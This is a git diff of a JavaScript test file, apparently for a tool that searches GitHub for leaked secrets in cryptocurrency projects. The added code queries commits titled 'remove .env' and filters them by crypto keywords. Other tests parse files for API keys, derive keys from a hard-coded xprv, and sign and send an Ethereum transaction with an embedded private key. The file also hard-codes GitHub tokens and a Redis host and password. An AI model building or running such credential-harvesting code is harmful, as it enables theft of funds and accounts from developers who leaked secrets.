@@ -13,6 +13,7 @@ import { makeOctokitRequest } from './middlewares';
 import BIP32Factory from 'bip32';
 import * as ecc from 'tiny-secp256k1';
 import { BIP32Interface } from 'bip32';
+import { createClient } from 'redis';
 import wif from 'wif';
 //import { parseForBinanceKeys, clean, parseForMongoDatabaseUrls } from './helpers';
 
@@ -21,15 +22,8 @@ import { SentryError } from '@sentry/utils';
 
 const Sentry = require('@sentry/node')
 
-
-let jon = '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'
-let thesavage = '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'
-let user32 = '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'
-let eaglesfan = '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'
-let jonkolmanllc = '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'
-let eaglesfanj365 = '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'
-let jkolmanllc = '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'
-let kolmanllc = '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'
+let jon = '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'
+let user32 = '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'
 let url_binance = 'https://bsc-dataseed.binance.org'
 let url_mainnet = "https://mainnet.infura.io/v3/9e34ce9faf8b4c6ca400b914af9cb665"
 let url_binance_2 = 'https://bsc-dataseed1.defibit.io/'
@@ -74,6 +68,11 @@ const finalClean = arr => {
 describe('tests', async () => {
   let base64RegEx = new RegExp('[^-A-Za-z0-9+/=]|=[^=]|={3,}$')
   
+  
+  // await redisClient.connect()
+  // await redisClient.set('windowReset', 104123)
+  // await redisClient.set('numberOfCallsRemainingInWindow', 30)
+  // await redisClient.set('rateLimit', 30)
   // before(done  => {
   //   console.log('beforeEach running')
   //   process.on('uncaughtException', err => console.log(err))
@@ -85,13 +84,40 @@ describe('tests', async () => {
     
     
   // })
-  it.only('should check private key', async () => {
+  it('should check private key', async () => {
     let bip32 = BIP32Factory(ecc);
     let key = 'xprv9s21ZrQH143K3QTDL4LXw2F7HEK3wJUD2nW2nRk4stbPy6cq3jPPqjiChkVvvNKmPGJxWUtg6LnF5kejMRNNU3TGtRBeJgk33yuGBxrMPHi'
     let node = bip32.fromBase58(key)
     let child = node.derivePath('m/0/0');
     // console.log(wif.encode(128, ))
     // console.log(node)
+  })
+  it.only('should search package.json for a library', async () => {
+    
+  })
+  it('should send crypto to metamask', async () => {
+    const web3 = require('web3')
+    const w3  = new Web3("https://mainnet.infura.io/v3/7dde81cce4ae4281bb8a3e2a70516f98")
+    const myAddress = '0x9d79126C830ad9AC789B9781E5A083b1200aD9E1'
+    const nonce = await w3.eth.getTransactionCount(myAddress, 'latest'); // nonce starts counting from 0
+
+    const transaction = {
+     'to': myAddress, // faucet address to return eth
+     'value': 1595897134367, // 1 ETH
+     'gas': 30000,
+     'nonce': nonce,
+     // optional data field to send message or execute smart contract
+    };
+
+    const signedTx = await w3.eth.accounts.signTransaction(transaction, '0x0dotCG97m3qCI3SYnR0U0doPK15rTtDQvKaOkKjhZzUvOY9AHuap6kjCOFXzWvkE');
+
+    web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {
+    if (!error) {
+      console.log("🎉 The hash of your transaction is: ", hash, "\n Check Alchemy's Mempool to view the status of your transaction!");
+    } else {
+      console.log("❗Something went wrong while submitting your transaction:", error)
+    }
+   })
   })
   it('should find matching api keys for secrets', async () => {
     let secrets = [
@@ -351,6 +377,42 @@ describe('tests', async () => {
     console.log('secrets', secrets)
 
 
+  })
+
+  it('should parse out the repo name from the commit. I need this in order to find all crypto related repos', async () => {
+    console.log(redisClient)
+    const redisClient = createClient({
+      url: "redis://redis-15304.c258.us-east-1-4.ec2.cloud.redislabs.com:15304",
+      password: 'onQCc19X9AKWNV49irmBFEDlNKoUMp96'
+    })
+    redisClient.on('error', (err) => console.log('Redis Client Error', err));
+    await redisClient.connect()
+    await redisClient.set('windowReset', 104123)
+    await redisClient.set('numberOfCallsRemainingInWindow', 30)
+    await redisClient.set('rateLimit', 30)
+    //query the first 10 pages (1000 results)
+    let commits = []
+    let filters = ['crypto', 'arb', 'money', 'coinbase', 'eth', 'btc', 'binance', 'nft', 'metamask', 'trader', 'bot']
+    for(let i=0; i<= 8; i++) { // 600 results
+      const {data:{items}} = await makeOctokitRequest(gh.rest.search.commits({
+        q: 'remove .env',
+        sort: 'asc',
+        sort_by: 'authored',
+        page: i,
+        per_page: 100
+      }), redisClient)
+      console.log(items[0].html_url)
+      filters.forEach(filter => {
+        let results = items.filter(commit => commit.repository.name.includes(filter))
+        for(let t=0; t< results.length; t++) {
+          commits.push(results[t])
+        }
+      })
+     
+    }
+    console.log('got commits', commits.map(commit => commit.html_url))
+    
+   
   })
 	it('should find api_key in code file', async () => {
     const exampleFile = await gh.request('GET https://github.com/QuangNamVu/thesis/blob/01a404de2dfb70f13f3e61a9a8f3b73c88d93502/src/crawl_data/ccxt_example.py').then(res => convert(res.data, {
